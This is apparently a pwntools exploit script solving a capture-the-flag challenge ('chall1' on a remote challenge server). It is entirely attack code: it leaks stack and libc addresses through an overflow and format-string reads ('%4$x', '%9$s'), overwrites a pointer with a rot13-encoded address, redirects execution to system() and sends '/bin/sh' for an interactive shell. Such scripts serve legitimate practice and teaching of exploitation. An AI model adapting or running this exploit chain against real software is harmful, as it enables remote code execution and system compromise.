from pwn import *

s = process("./chall1")
s = remote("challenge.pwny.racing", 11526)
s.sendline("1")
s.clean(5)

buf = "1"*0x41
s.sendline(buf)

buf = s.recvline()
print repr(buf)

resp = buf [6:-1]
ptr = resp[0x40:]

stack_ptr = u32(ptr)

buf_ptr = stack_ptr & 0xffffff00
buf_ptr |= 0x64

print hex(buf_ptr)

import string
rot13 = string.maketrans( "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")

def set_pc(addr):
    nw_ptr = p32(buf_ptr+0x40)
    p = 0x68-0xc
    find = "1"*4
    find += "2"*4
    write_ptr = buf_ptr-0x38
    write_ptr = 0x8052040
    find += p32(write_ptr)
    print hex(write_ptr)
    chain = string.translate(p32(addr),rot13)+"\x00"
    chain += "B"*(0x40-len(chain))
    buf = chain+"\x00"+find
    s.sendline("Y")
    s.sendline("-1")
    s.sendline(buf)

print "Setting PC"
set_pc(0x80485a0)
print "PC Set"
s.sendline("y")
s.sendline("1")
s.clean(5)
s.sendline("%4$xABCD")
s.recvuntil("): ")
print "this other point"
buf = s.recvuntil("ABCD")
libcptr = int(buf[:8],16)
print hex(libcptr)
systemptr = libcptr-0x195840
print hex(systemptr)

s.sendline("y")
s.sendline("1")
ptr = 0x805200c
s.sendline(p32(ptr)+"AAAA%9$sBBBB")
s.recvuntil("AAAA")
buf = s.recvuntil("BBBB")
print repr(buf)
printfaddr = u32(buf[:4])
getcharaddr = u32(buf[8:12])
print hex(printfaddr)
print hex(getcharaddr)
systemptr = printfaddr-0x050b60+0x03cd10

set_pc(systemptr)
s.sendline("Y")
s.sendline("1")
s.sendline("/bin/sh")
s.interactive()